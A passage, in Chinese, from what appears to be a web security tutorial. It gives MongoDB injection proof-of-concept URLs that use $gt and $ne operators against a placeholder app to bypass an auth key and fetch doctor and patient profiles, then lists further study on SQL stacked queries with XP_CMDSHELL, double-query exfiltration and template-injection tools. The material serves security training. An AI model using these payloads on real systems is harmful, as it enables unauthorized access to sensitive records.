还有其他运算符，如 `$gt` 和 `$ne`，可用于查询以从数据库中返回特定记录。以下是应用程序其他功能中找到的 POC。

**检索医生详细信息的 POC**
`$gt` 运算符将检索 AuthToken 值大于 0 的记录。在大多数情况下，这将包括具有正数值 AuthToken 值的记录。
```
https://vulnerableapp.com/api/v1/doctor/getProfile?DoctorID=18141842&AuthKey[$gt]=0&UserType=doctor
```

**检索患者详细信息的 POC**
`$ne` 运算符将检索 `Auth_Key` 不等于 `0` 的记录；它将排除 Auth_Key 为 0 的记录，这可能表示无效或不活跃的账户。
```
https://vulnerableapp.com/api/v1/patients/getProfile?PatientID=123123213&AuthKey[$ne]=0
```

**提示：** 虽然前面描述的测试用例是针对基于布尔的注入，即你可以操纵查询以返回真或假条件，但测试其他类型的 MongoDB 注入漏洞也很重要。要测试潜在的 MongoDB 注入，请尝试在输入字段中使用特殊字符，如单引号（`'`）、双引号（`"`）、分号（`;`）、反斜杠（`\`）、括号（`()`）、方括号（`[]`）和花括号（`{}`）。

## 3.11 额外进阶

- **SQL 注入实验室**：尝试使用 `sqli-labs`，这是一个提供 12 种不同场景的仓库，涵盖了广泛的 SQL 注入技术。[https://github.com/Audi-1/sqli-labs]
- **堆叠查询**：研究堆叠查询并了解如何利用它们来利用 SQL 注入漏洞。探索它们在 MSSQL 中调用存储过程（如 `XP_CMDSHELL`）以实现 RCE 的用途。
- **双查询**：尝试基于双查询的注入，并发现它在数据外泄中的用途，尤其是在缺少基于 UNION 的技术的情况下。
- **SSTI 检测和利用工具**：探索像 TINJA 和 TPLMAP 这样的工具，用于自动检测和利用模板注入攻击。[TINJA](https://github.com/Hackmanit/TInjA) | [TPLMAP](https://github.com/epinna/tplmap)
- **模板注入表**：查看“Template Injection Table”，这是一个交互式表格，包含高效的模板注入 polyglot 以及来自 44 个主要模板引擎的预期响应。[https://github.com/Hackmanit/template-injection-table]
- **NoSQL 注入**：研究在 Elasticsearch、Amazon DynamoDB、Couchbase 等数据库中利用 NoSQL 注入漏洞的技术。
